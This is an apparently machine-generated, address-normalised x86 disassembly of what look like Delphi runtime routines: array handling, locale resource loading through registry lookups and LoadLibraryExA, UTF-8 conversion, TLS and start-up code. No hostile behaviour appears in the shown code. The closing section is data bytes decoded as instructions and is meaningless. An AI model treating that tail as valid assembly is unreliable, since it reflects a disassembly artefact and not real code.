call sub_403f08
add ebx 0x4
add esi 0x4
dec ebp
jne r-xdata
cmp cl 0xb
je r-xdata
jmp r-xdata
mov eax ebx
mov edx [ esi ]
call sub_4045d0
add ebx 0x4
add esi 0x4
dec ebp
jne r-xdata
cmp cl 0xc
je r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn 0x4
jmp r-xdata
mov eax ebx
mov edx esi
call sub_404a28
add ebx 0x10
add esi 0x10
dec ebp
jne r-xdata
cmp cl 0xd
je r-xdata
jmp r-xdata
xor ecx ecx
mov cl [ edi + 0x1 ]
lea edi [ ecx + edi + 0x2 ]
cmp cl 0xe
je r-xdata
mov eax ebx
mov edx esi
mov ecx [ edi + 0x8 ]
push [ edi + 0x4 ]
call sub_404b5c
add ebx [ edi ]
add esi [ edi ]
dec ebp
jne r-xdata
jmp r-xdata
mov eax ebx
mov edx esi
mov ecx edi
call sub_404a40
xor eax eax
mov al [ edi + 0x1 ]
add ebx [ eax + edi + 0x2 ]
add esi [ eax + edi + 0x2 ]
dec ebp
jne r-xdata
cmp cl 0xf
je r-xdata
jmp r-xdata
mov eax ebx
mov edx [ esi ]
call sub_405508
add ebx 0x4
add esi 0x4
dec ebp
jne r-xdata
cmp cl 0x11
je r-xdata
jmp r-xdata
mov eax ebx
mov edx [ esi ]
mov ecx edi
call sub_404e80
add ebx 0x4
add esi 0x4
dec ebp
jne r-xdata
mov al 0x2
pop ebp
pop edi
pop esi
pop ebx
jmp sub_402828
sub_404c58
push edx
push eax
mov eax [ esp + 0x10 ]
mul [ esp ]
mov ecx eax
mov eax [ esp + 0x4 ]
mul [ esp + 0xc ]
add ecx eax
mov eax [ esp ]
mul [ esp + 0xc ]
add edx ecx
pop ecx
pop ecx
retn 0x8
sub_404cac
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
push edi
mov [ ebp - 0x8 ] ecx
mov esi edx
mov [ ebp - 0x4 ] eax
mov ebx [ ebp - 0x4 ]
mov ebx [ ebx ]
mov eax [ ebp + 0x8 ]
mov edi [ eax ]
test edi edi
jg r-xdata
xor eax eax
mov [ ebp - 0x10 ] eax
test ebx ebx
je r-xdata
test edi edi
jge r-xdata
xor eax eax
mov al [ esi + 0x1 ]
add esi eax
mov eax esi
mov edx [ eax + 0x2 ]
mov [ ebp - 0x18 ] edx
mov edx [ eax + 0x6 ]
test edx edx
je r-xdata
sub ebx 0x4
mov eax [ ebx ]
mov [ ebp - 0x10 ] eax
sub ebx 0x4
mov eax [ ebp - 0x4 ]
mov edx esi
call sub_404ca4
jmp r-xdata
mov al 0x4
call sub_402828
xor esi esi
mov esi [ edx ]
jmp r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
add [ ebp - 0x1c ] 0x8
test ebx ebx
je r-xdata
mov al 0x4
call sub_402828
mov eax edi
imul [ ebp - 0x18 ]
mov [ ebp - 0x1c ] eax
mov eax [ ebp - 0x1c ]
cdq
idiv edi
cmp eax [ ebp - 0x18 ]
je r-xdata
mov [ ebp - 0x20 ] ebx
cmp edi [ ebp - 0x10 ]
jge r-xdata
cmp [ ebx ] 0x1
jne r-xdata
lea eax [ ebp - 0x20 ]
mov edx [ ebp - 0x1c ]
call sub_40270c
mov ebx [ ebp - 0x20 ]
jmp r-xdata
test esi esi
je r-xdata
dec [ ebx ]
mov eax [ ebp - 0x1c ]
call sub_4026cc
mov ebx eax
mov eax [ ebp - 0x10 ]
mov [ ebp - 0x14 ] eax
cmp edi [ ebp - 0x14 ]
jge r-xdata
mov [ ebx ] 0x1
add ebx 0x4
mov [ ebx ] edi
add ebx 0x4
mov edx edi
sub edx [ ebp - 0x10 ]
imul edx [ ebp - 0x18 ]
mov eax [ ebp - 0x18 ]
imul eax [ ebp - 0x10 ]
add eax ebx
xor ecx ecx
call sub_402b04
cmp [ ebp - 0x8 ] 0x1
jle r-xdata
mov eax ebx
add eax 0x8
mov edx edi
imul edx [ ebp - 0x18 ]
add eax edx
mov ecx [ ebp - 0x10 ]
sub ecx edi
mov edx esi
call j_sub_404930
test esi esi
je r-xdata
mov [ ebp - 0x14 ] edi
mov eax [ ebp - 0x4 ]
mov [ eax ] ebx
add [ ebp + 0x8 ] 0x4
dec [ ebp - 0x8 ]
dec edi
test edi edi
jl r-xdata
mov ecx [ ebp - 0x14 ]
imul ecx [ ebp - 0x18 ]
mov edx ebx
add edx 0x8
mov eax [ ebp - 0x4 ]
mov eax [ eax ]
call sub_4028c8
mov edx [ ebp - 0x14 ]
imul edx [ ebp - 0x18 ]
mov eax ebx
add eax 0x8
xor ecx ecx
call sub_402b04
mov eax [ ebp - 0x14 ]
push eax
mov edx [ ebp - 0x4 ]
mov edx [ edx ]
mov eax ebx
add eax 0x8
mov ecx esi
call sub_404c8c
jmp r-xdata
inc edi
mov [ ebp - 0xc ] 0x0
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp - 0xc ]
lea eax [ ebx + eax * 4 ]
mov ecx [ ebp - 0x8 ]
mov edx esi
call sub_404cac
inc [ ebp - 0xc ]
dec edi
jne r-xdata
sub_404e44
mov ecx [ eax ]
test ecx ecx
je r-xdata
retn
mov [ eax ] 0x0
[ ecx - 0x8 ]
jne r-xdata
push eax
mov eax ecx
xor ecx ecx
mov cl [ edx + 0x1 ]
mov edx [ ecx + edx + 0x6 ]
test edx edx
je r-xdata
sub eax 0x8
call sub_4026ec
pop eax
mov ecx [ eax - 0x4 ]
test ecx ecx
je r-xdata
mov edx [ edx ]
call sub_404930
sub_404e80
push ebx
mov ebx [ eax ]
test edx edx
je r-xdata
test ebx ebx
je r-xdata
[ edx - 0x8 ]
mov [ eax ] edx
pop ebx
retn
[ ebx - 0x8 ]
jne r-xdata
push eax
push edx
mov edx ecx
inc [ ebx - 0x8 ]
call sub_404e44
pop edx
pop eax
sub_404ea8
add esp 0xffffffe4
push 0x1c
lea edx [ esp + 0x4 ]
push edx
push eax
call sub_4012dc
cmp [ esp + 0x10 ] 0x1000
jne r-xdata
xor eax eax
mov eax [ esp + 0x4 ]
jmp r-xdata
add esp 0x1c
retn
sub_404ed8
push ebx
push esi
add esp 0xfffffef8
mov ebx eax
cmp [ ebx + 0x10 ] 0x0
jne r-xdata
mov eax [ ebx + 0x10 ]
add esp 0x108
pop esi
pop ebx
retn
push 0x105
lea eax [ esp + 0x4 ]
push eax
mov eax [ ebx + 0x4 ]
push eax
call sub_40126c
mov eax esp
mov dl 0x1
call sub_405114
mov esi eax
mov [ ebx + 0x10 ] esi
test esi esi
jne r-xdata
mov eax [ ebx + 0x4 ]
mov [ ebx + 0x10 ] eax
sub_404f20
mov edx [ rw-data ]
test edx edx
je r-xdata
retn
cmp eax [ edx + 0x4 ]
je r-xdata
mov eax edx
call sub_404ed8
retn
cmp eax [ edx + 0x8 ]
je r-xdata
cmp eax [ edx + 0xc ]
jne r-xdata
mov edx [ edx ]
test edx edx
jne r-xdata
sub_404f5c
push ebp
mov ebp esp
add esp 0xfffffdb0
push ebx
push esi
push edi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov [ ebp - 0xc ] eax
push r-xdata
call sub_401274
mov esi eax
test esi esi
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax ] 0x5c
jne r-xdata
push r-xdata
push esi
call sub_40127c
mov ebx eax
test ebx ebx
je r-xdata
mov esi [ ebp - 0x4 ]
add esi 0x2
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1 ] 0x5c
jne r-xdata
push 0x105
lea eax [ ebp - 0x24f ]
push eax
mov eax [ ebp - 0x4 ]
push eax
call ebx
test eax eax
je r-xdata
cmp [ esi ] 0x0
jne r-xdata
mov eax [ ebp - 0xc ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
add eax 0x2
call sub_404f48
mov esi eax
cmp [ esi ] 0x0
je r-xdata
mov eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x24f ]
push eax
mov eax [ ebp - 0x4 ]
push eax
call lstrcpynA
jmp r-xdata
lea eax [ esi + 0x1 ]
call sub_404f48
mov edi eax
mov eax edi
sub eax esi
mov edx eax
add edx ebx
inc edx
cmp edx 0x105
jg r-xdata
mov eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x24f ]
push eax
mov eax [ ebp - 0x4 ]
push eax
call lstrcpynA
lea eax [ esi + 0x1 ]
call sub_404f48
mov esi eax
cmp [ esi ] 0x0
je r-xdata
inc eax
push eax
push esi
lea eax [ ebp - 0x24f ]
add eax ebx
push eax
call lstrcpynA
lea eax [ ebp - 0x14a ]
push eax
lea eax [ ebp - 0x24f ]
push eax
call FindFirstFileA
mov esi eax
cmp esi 0xffffffff
je r-xdata
jmp r-xdata
push esi
call FindClose
lea eax [ ebp - 0x11e ]
push eax
call lstrlenA
lea edx [ ebx + 0x1 ]
add eax edx
inc eax
cmp eax 0x105
jg r-xdata
mov ebx esi
sub ebx [ ebp - 0x4 ]
lea eax [ ebx + 0x1 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
lea eax [ ebp - 0x24f ]
push eax
call lstrcpynA
jmp r-xdata
mov [ ebp + ebx - 0x24f ] 0x5c
mov eax 0x105
sub eax ebx
dec eax
push eax
lea eax [ ebp - 0x11e ]
push eax
lea eax [ ebp - 0x24f ]
add eax ebx
inc eax
push eax
call lstrcpynA
lea eax [ ebp - 0x11e ]
push eax
call lstrlenA
inc eax
add ebx eax
mov esi edi
sub_405114
push ebp
mov ebp esp
add esp 0xfffffee0
push ebx
push esi
mov [ ebp - 0x4 ] eax
push 0x105
lea eax [ ebp - 0x11d ]
push eax
push 0x0
call sub_40126c
mov [ ebp - 0x12 ] 0x0
lea eax [ ebp - 0x8 ]
push eax
push 0xf0019
push 0x0
push r-xdata
push 0x80000001
call sub_4012c4
test eax eax
je r-xdata
xor eax eax
push ebp
push sub_405219
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x18 ] 0x5
lea eax [ ebp - 0x11d ]
mov edx 0x105
call sub_404f5c
lea eax [ ebp - 0x18 ]
push eax
lea eax [ ebp - 0x12 ]
push eax
push 0x0
push 0x0
lea eax [ ebp - 0x11d ]
push eax
mov eax [ ebp - 0x8 ]
push eax
call sub_4012cc
test eax eax
je r-xdata
lea eax [ ebp - 0x8 ]
push eax
push 0xf0019
push 0x0
push r-xdata
push 0x80000002
call sub_4012c4
test eax eax
je r-xdata
mov [ ebp - 0xe ] 0x0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x8 ]
push eax
call sub_4012bc
retn
lea eax [ ebp - 0x18 ]
push eax
lea eax [ ebp - 0x12 ]
push eax
push 0x0
push 0x0
push r-xdata
mov eax [ ebp - 0x8 ]
push eax
call sub_4012cc
test eax eax
je r-xdata
lea eax [ ebp - 0x8 ]
push eax
push 0xf0019
push 0x0
push r-xdata
push 0x80000001
call sub_4012c4
test eax eax
jne r-xdata
mov [ ebp - 0x12 ] 0x0
push 0x105
mov eax [ ebp - 0x4 ]
push eax
lea eax [ ebp - 0x11d ]
push eax
call lstrcpynA
push 0x5
lea eax [ ebp - 0xd ]
push eax
push 0x3
call sub_40128c
push eax
call sub_401264
xor esi esi
cmp [ ebp - 0x11d ] 0x0
je r-xdata
mov eax esi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
cmp [ ebp - 0xd ] 0x0
jne r-xdata
lea eax [ ebp - 0x11d ]
push eax
call lstrlenA
mov ebx eax
lea eax [ ebp - 0x11d ]
add ebx eax
jmp r-xdata
cmp [ ebp - 0x12 ] 0x0
je r-xdata
cmp [ ebx ] 0x2e
je r-xdata
lea eax [ ebp - 0x11d ]
cmp ebx eax
je r-xdata
lea eax [ ebp - 0x11d ]
cmp ebx eax
jne r-xdata
inc ebx
cmp [ ebp - 0x12 ] 0x0
je r-xdata
dec ebx
test esi esi
jne r-xdata
mov edx ebx
sub edx eax
mov eax 0x105
sub eax edx
push eax
lea eax [ ebp - 0x12 ]
push eax
push ebx
call lstrcpynA
push 0x2
push 0x0
lea eax [ ebp - 0x11d ]
push eax
call LoadLibraryExA
mov esi eax
cmp [ ebp - 0xd ] 0x0
je r-xdata
lea eax [ ebp - 0x11d ]
mov edx ebx
sub edx eax
mov eax 0x105
sub eax edx
push eax
lea eax [ ebp - 0xd ]
push eax
push ebx
call lstrcpynA
push 0x2
push 0x0
lea eax [ ebp - 0x11d ]
push eax
call LoadLibraryExA
mov esi eax
test esi esi
jne r-xdata
mov [ ebp - 0xb ] 0x0
lea eax [ ebp - 0x11d ]
mov edx ebx
sub edx eax
mov eax 0x105
sub eax edx
push eax
lea eax [ ebp - 0xd ]
push eax
push ebx
call lstrcpynA
push 0x2
push 0x0
lea eax [ ebp - 0x11d ]
push eax
call LoadLibraryExA
mov esi eax
sub_4053b4
push ebx
push esi
mov esi [ rw-data ]
test esi esi
je r-xdata
mov edx esi
test edx edx
je r-xdata
mov edx [ esi + 0x4 ]
cmp edx eax
jne r-xdata
pop esi
pop ebx
retn
mov ecx [ edx ]
test ecx ecx
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
mov [ rw-data ] eax
mov edx 0x8
mov eax esi
call sub_4026ec
pop esi
pop ebx
retn
mov edx [ edx ]
test edx edx
jne r-xdata
mov ebx [ ecx + 0x4 ]
cmp ebx eax
jne r-xdata
mov esi ecx
mov eax [ ecx ]
mov [ edx ] eax
mov edx 0x8
mov eax esi
call sub_4026ec
jmp r-xdata
sub_405414
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ rw-data ]
mov [ ebp - 0x8 ] eax
cmp [ ebp - 0x8 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
xor eax eax
push ebp
push sub_40544f
push [ fs : eax ]
mov [ fs : eax ] esp
mov ebx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call [ ebx + 0x4 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
mov [ ebp - 0x8 ] eax
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
sub_405480
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] eax
xor edx edx
push ebp
push sub_4054e4
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
call sub_405414
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4054eb
mov eax [ ebp - 0x4 ]
cmp eax [ rw-data ]
jne r-xdata
mov eax [ rw-data ]
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax ]
mov [ rw-data ] eax
jmp r-xdata
retn
mov edx [ eax ]
cmp edx [ ebp - 0x4 ]
jne r-xdata
mov eax [ eax ]
test eax eax
jne r-xdata
mov edx [ ebp - 0x4 ]
mov edx [ edx ]
mov [ eax ] edx
jmp r-xdata
sub_405508
test edx edx
je r-xdata
mov ecx [ eax ]
test ecx ecx
mov [ eax ] edx
je r-xdata
push edx
push eax
mov eax [ edx ]
push edx
call [ eax + 0x4 ]
pop eax
mov ecx [ eax ]
pop [ eax ]
test ecx ecx
jne r-xdata
retn
mov eax [ ecx ]
push ecx
call [ eax + 0x8 ]
mov eax [ ecx ]
push ecx
call [ eax + 0x8 ]
retn
retn
sub_405534
test edx edx
je sub_4054f0
push edi
mov edi eax
push 0x0
push esp
push ecx
push edx
mov eax [ edx ]
call [ eax ]
test eax eax
je r-xdata
mov eax [ edi ]
test eax eax
je r-xdata
mov al 0x17
jmp sub_402828
pop eax
mov [ edi ] eax
pop edi
retn
push eax
mov eax [ eax ]
call [ eax + 0x8 ]
sub_4055d8
push ebp
mov ebp esp
push ebx
push esi
mov ebx [ ebp + 0x8 ]
lea eax [ ebx + 0x4 ]
push eax
call sub_401304
mov esi eax
test esi esi
jne r-xdata
mov eax esi
pop esi
pop ebx
pop ebp
retn 0x4
mov dl 0x1
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x4 ]
sub_405600
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
xor edx edx
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov eax edx
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x4
xor esi esi
xor ecx ecx
test eax eax
je r-xdata
cmp ecx [ ebp + 0x8 ]
jae r-xdata
jmp r-xdata
lea edx [ esi + 0x1 ]
mov eax [ ebp - 0x8 ]
movzx edx [ eax + ecx * 2 ]
inc ecx
cmp edx 0x7f
jbe r-xdata
cmp ecx [ ebp + 0x8 ]
jae r-xdata
inc esi
cmp ecx [ ebp + 0x8 ]
jb r-xdata
cmp edx 0x7ff
jbe r-xdata
cmp esi [ ebp - 0x4 ]
jb r-xdata
cmp esi [ ebp - 0x4 ]
jb r-xdata
inc esi
inc esi
mov [ eax + esi ] 0x0
jmp r-xdata
mov esi [ ebp - 0x4 ]
dec esi
mov edx [ ebp - 0x8 ]
movzx edx [ edx + ecx * 2 ]
inc ecx
cmp edx 0x7f
ja r-xdata
cmp edx 0x7ff
jbe r-xdata
mov [ eax + esi ] dl
inc esi
jmp r-xdata
lea ebx [ esi + 0x2 ]
cmp ebx [ ebp - 0x4 ]
ja r-xdata
lea ebx [ esi + 0x3 ]
cmp ebx [ ebp - 0x4 ]
ja r-xdata
mov ebx edx
shr ebx 0x6
or bl 0xc0
mov [ eax + esi ] bl
and dl 0x3f
or dl 0x80
mov [ eax + esi + 0x1 ] dl
add esi 0x2
mov ebx edx
shr ebx 0xc
or bl 0xe0
mov [ eax + esi ] bl
mov ebx edx
shr ebx 0x6
and bl 0x3f
or bl 0x80
mov [ eax + esi + 0x1 ] bl
and dl 0x3f
or dl 0x80
mov [ eax + esi + 0x2 ] dl
add esi 0x3
jmp r-xdata
sub_4056dc
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0xc ] 0x0
jne r-xdata
mov [ ebp - 0x10 ] 0xffffffff
xor eax eax
xor esi esi
cmp [ ebp - 0x4 ] 0x0
je r-xdata
xor eax eax
mov [ ebp - 0x10 ] eax
jmp r-xdata
cmp esi [ ebp + 0x8 ]
jae r-xdata
jmp r-xdata
mov eax [ ebp - 0x10 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
inc eax
mov [ ebp - 0x10 ] eax
mov edx [ ebp - 0xc ]
mov dl [ edx + esi ]
inc esi
test dl 0x80
je r-xdata
cmp esi [ ebp + 0x8 ]
jae r-xdata
inc eax
cmp esi [ ebp + 0x8 ]
jb r-xdata
cmp esi [ ebp + 0x8 ]
jae r-xdata
cmp eax [ ebp - 0x8 ]
jb r-xdata
cmp eax [ ebp - 0x8 ]
jb r-xdata
and dl 0x3f
test dl 0x20
je r-xdata
mov edx [ ebp - 0x4 ]
mov [ edx + eax * 2 ] 0x0
jmp r-xdata
mov eax [ ebp - 0x8 ]
dec eax
mov edx [ ebp - 0xc ]
xor ecx ecx
mov cl [ edx + esi ]
inc esi
test cl 0x80
je r-xdata
mov edx [ ebp - 0xc ]
mov dl [ edx + esi ]
inc esi
and dl 0xc0
cmp dl 0x80
jne r-xdata
mov edx [ ebp - 0xc ]
mov dl [ edx + esi ]
inc esi
and dl 0xc0
cmp dl 0x80
jne r-xdata
mov edx [ ebp - 0x4 ]
mov [ edx + eax * 2 ] cx
cmp esi [ ebp + 0x8 ]
jae r-xdata
cmp esi [ ebp + 0x8 ]
jae r-xdata
and ecx 0x3f
test cl 0x20
je r-xdata
mov edx [ ebp - 0xc ]
mov dl [ edx + esi ]
inc esi
mov ebx edx
and bl 0xc0
cmp bl 0x80
jne r-xdata
mov edx [ ebp - 0xc ]
mov dl [ edx + esi ]
inc esi
mov ebx edx
and bl 0xc0
cmp bl 0x80
jne r-xdata
and dl 0x3f
and edx 0xff
shl ecx 0x6
or dx cx
mov ecx [ ebp - 0x4 ]
mov [ ecx + eax * 2 ] dx
jmp r-xdata
cmp esi [ ebp + 0x8 ]
jae r-xdata
inc eax
and dl 0x3f
and edx 0xff
shl ecx 0x6
or edx ecx
mov ecx edx
sub_405814
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_4058b3
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
call sub_403eb4
mov eax ebx
xor edx edx
call sub_40470c
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4058ba
lea eax [ ebp - 0x4 ]
call sub_403eb4
retn
mov eax ebx
call sub_404700
lea edx [ eax + eax * 2 ]
lea eax [ ebp - 0x4 ]
call sub_404500
mov eax ebx
call sub_404700
push eax
mov eax [ ebp - 0x4 ]
call sub_404174
inc eax
push eax
mov eax ebx
call sub_4046f0
push eax
mov eax [ ebp - 0x4 ]
call sub_404374
pop ecx
pop edx
call sub_405600
test eax eax
jle r-xdata
lea eax [ ebp - 0x4 ]
call sub_403eb4
mov edx eax
dec edx
lea eax [ ebp - 0x4 ]
call sub_404500
jmp r-xdata
mov eax esi
mov edx [ ebp - 0x4 ]
call sub_403f08
sub_4058c0
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_405957
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
call sub_404594
test ebx ebx
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40595e
lea eax [ ebp - 0x4 ]
call sub_404594
retn
mov eax ebx
call sub_404174
mov edx eax
lea eax [ ebp - 0x4 ]
call sub_4047dc
mov eax ebx
call sub_404174
push eax
mov eax [ ebp - 0x4 ]
call sub_404700
inc eax
push eax
mov eax ebx
call sub_404374
push eax
mov eax [ ebp - 0x4 ]
call sub_4046f0
pop ecx
pop edx
call sub_4056dc
test eax eax
jle r-xdata
lea eax [ ebp - 0x4 ]
call sub_404594
mov edx eax
dec edx
lea eax [ ebp - 0x4 ]
call sub_4047dc
jmp r-xdata
mov eax esi
mov edx [ ebp - 0x4 ]
call sub_4045d0
sub_405964
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_4059a7
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
mov edx ebx
call sub_4046e0
mov eax [ ebp - 0x4 ]
mov edx esi
call sub_405814
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4059ae
lea eax [ ebp - 0x4 ]
call sub_404594
retn
sub_4059b4
push ebx
push esi
add esp 0xfffffc00
mov esi edx
mov ebx eax
test ebx ebx
je r-xdata
add esp 0x400
pop esi
pop ebx
retn
cmp [ ebx + 0x4 ] 0x10000
jge r-xdata
mov eax esi
mov edx [ ebx + 0x4 ]
call sub_4040ac
push 0x400
lea eax [ esp + 0x4 ]
push eax
mov eax [ ebx + 0x4 ]
push eax
mov eax [ ebx ]
mov eax [ eax ]
call sub_404f20
push eax
call sub_40129c
mov ecx eax
mov edx esp
mov eax esi
call sub_403fa4
jmp r-xdata
sub_405a0c
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
xor edx edx
mov [ ebp - 0x10 ] edx
xor edx edx
push ebp
push sub_405a72
push [ fs : edx ]
mov [ fs : edx ] esp
push 0x7
lea edx [ ebp - 0xb ]
push edx
push 0x1004
push eax
call sub_401264
lea eax [ ebp - 0x10 ]
lea edx [ ebp - 0xb ]
mov ecx 0x7
call sub_404124
mov eax [ ebp - 0x10 ]
lea edx [ ebp - 0x4 ]
call sub_402b24
mov ebx eax
cmp [ ebp - 0x4 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_405a79
lea eax [ ebp - 0x10 ]
call sub_403eb4
retn
xor ebx ebx
sub_405a80
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_405aca
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_405ad1
retn
mov eax rw-data
call sub_40299c
mov eax rw-data
call sub_40299c
mov eax rw-data
call sub_40299c
call sub_401ad0
sub_405ad4
sub [ rw-data ] 0x1
jae r-xdata
retn
mov [ rw-data ] 0x2
mov [ rw-data ] r-xdata
mov [ rw-data ] r-xdata
mov [ rw-data ] 0x2
mov [ rw-data ] sub_404c50
call sub_402f30
test al al
je r-xdata
call sub_403024
mov [ rw-data ] 0xd7b0
mov [ rw-data ] 0xd7b0
mov [ rw-data ] 0xd7b0
call GetCommandLineA
mov [ rw-data ] eax
call sub_40131c
mov [ rw-data ] eax
call sub_401314
and eax 0x80000000
cmp eax 0x80000000
je r-xdata
call sub_402f60
call sub_40128c
call sub_405a0c
mov [ rw-data ] eax
call sub_401314
and eax 0xff
cmp ax 0x4
jbe r-xdata
call sub_40128c
call sub_405a0c
mov [ rw-data ] eax
jmp r-xdata
mov [ rw-data ] 0x3
jmp r-xdata
call sub_40130c
mov [ rw-data ] eax
sub_405bdc
push ebx
call sub_405bd4
mov ebx eax
test ebx ebx
je r-xdata
pop ebx
retn
cmp [ rw-data ] 0xffffffff
jne r-xdata
mov eax ebx
call sub_405bc8
test eax eax
jne r-xdata
mov eax 0xe2
call sub_403e24
push eax
mov eax [ rw-data ]
push eax
call TlsSetValue
mov eax 0xe2
call sub_403e24
sub_405c20
mov cl [ rw-data ]
mov eax [ rw-data ]
test cl cl
jne r-xdata
push eax
call TlsGetValue
test eax eax
je r-xdata
mov edx [ fs : 0x2c ]
mov eax [ edx + eax * 4 ]
retn
call sub_405bdc
mov eax [ rw-data ]
push eax
call TlsGetValue
test eax eax
je r-xdata
retn
mov eax [ rw-data ]
retn
retn
sub_405c6c
push ebx
mov ebx eax
xor eax eax
mov [ rw-data ] eax
push 0x0
call sub_405ba8
mov [ rw-data ] eax
mov eax [ rw-data ]
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
call sub_405c60
mov edx rw-data
mov eax ebx
call sub_403b78
pop ebx
retn
sub_405cb0
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_405cd5
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_405cdc
retn
sub_405d0c
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
mov [ ebx ] eax
mov [ ebx + 0x4 ] edx
add ecx eax
mov [ ebx + 0x8 ] ecx
add edx [ ebp + 0xc ]
mov [ ebx + 0xc ] edx
pop ebx
pop ebp
retn 0x8
sub_405d28
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_405d4d
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_405d54
retn
sub_405d60
pop ebp
inc eax
add [ ebx ] al
add ch [ esi ]
xor [ 0x0 ] eax
or al 0x0
add [ eax ] al
pushad
pop ebp
inc eax
add [ edx ] cl
outsd
push ebx
insb
arpl [ gs : ebp + 0x64 ] si
or [ edi + 0x64 ] ch
inc edi
jb r-xdata
jb r-xdata
jns r-xdata
mov bl 0x46
xor [ fs : ebx ] ecx
outsd
push edx
jae r-xdata
or ch [ fs : edi + 0x64 ]
inc esp
imul esi [ ebx + 0x61 ] 0x64656c62
or [ edi + 0x64 ] ebp
inc ebx
push 0x656b6365
or [ fs : edi + 0x64 ] ebp
inc esi
outsd
arpl [ ebp + 0x73 ] si
or [ fs : edi + 0x64 ] ebp
inc esp
popa
jne r-xdata
inc esi
jb r-xdata
jb r-xdata
je r-xdata
mov dl 0x46
add [ ebx - 0x7da0040 ] cl
mov dl 0x46
add [ ebx - 0xbda0040 ] cl
mov dl 0x46
sar bh 0x25
cld
xor cl [ fs : esi ]
outsd
inc ebx
outsd
insd
bound ebp [ edi + 0x42 ]
outsd
js r-xdata
add [ ebx - 0xfda0040 ] cl
mov dl 0x46
add [ ebx - 0x13da0040 ] cl
mov dl 0x46
add [ ebx - 0x17da0040 ] cl
mov dl 0x46
add [ ebx - 0x1bda0040 ] cl
mov dl 0x46
add [ ebx - 0x1fda0040 ] cl
mov dl 0x46
add [ ebx - 0x23da0040 ] cl
mov dl 0x46
add [ ebx - 0x27da0040 ] cl
mov dl 0x46
add [ ebx - 0x2bda0040 ] cl
mov dl 0x46
add [ ebx - 0x2fda0040 ] cl
mov dl 0x46
add [ ebx - 0x33da0040 ] cl
mov dl 0x46
add [ ebx - 0x37da0040 ] cl
mov dl 0x46
add [ ebx - 0x3bda0040 ] cl
mov dl 0x46
add [ ebx - 0x3fda0040 ] cl
mov dl 0x46
add [ ebx - 0x43da0040 ] cl
mov dl 0x46
add [ ebx - 0x47da0040 ] cl
mov dl 0x46
add [ ebx - 0x4bda0040 ] cl
mov dl 0x46
add [ ebx - 0x4fda0040 ] cl
mov dl 0x46
add [ ebx - 0x53da0040 ] cl
mov dl 0x46
add [ ebx - 0x57da0040 ] cl
mov dl 0x46
add [ ebx - 0x5bda0040 ] cl
mov dl 0x46
add [ ebx - 0x5fda0040 ] cl
mov dl 0x46
add [ ebx - 0x63da0040 ] cl
mov dl 0x46
add [ ebx - 0x67da0040 ] cl
